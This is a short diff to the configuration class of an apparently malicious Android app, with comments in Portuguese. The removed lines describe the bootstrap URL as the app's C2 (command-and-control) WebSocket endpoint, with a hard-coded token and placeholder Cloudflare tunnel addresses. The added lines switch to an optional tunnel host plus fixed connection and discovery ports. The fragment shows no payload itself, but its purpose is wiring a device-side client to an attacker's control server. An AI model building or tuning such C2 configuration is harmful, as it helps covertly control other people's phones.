@@ -5,10 +5,13 @@ import android.content.Context;
 import java.util.Random;
 
 public final class Cfg {
-    // primeira linha do bootstrap = URL wss:// do C2 (com token)
     public static final String TOKEN = "3f7cm0ygvhr5w8";
-    public static final String BOOTSTRAP = "https://seu-tunel-aqui.trycloudflare.com/ws?t=3f7cm0ygvhr5w8";
-    public static final String FALLBACK = "wss://seu-tunel-aqui.trycloudflare.com/ws?t=3f7cm0ygvhr5w8";
+
+    // preencha SO se for usar tunel, ex: "algo-aleatorio.trycloudflare.com" (sem https://)
+    public static final String TUNNEL = "";
+
+    public static final int PORT = 8080;
+    public static final int DISC = 8089;
 
     public static String id(Context c) {
         String s = c.getSharedPreferences("p", 0).getString("id", null);
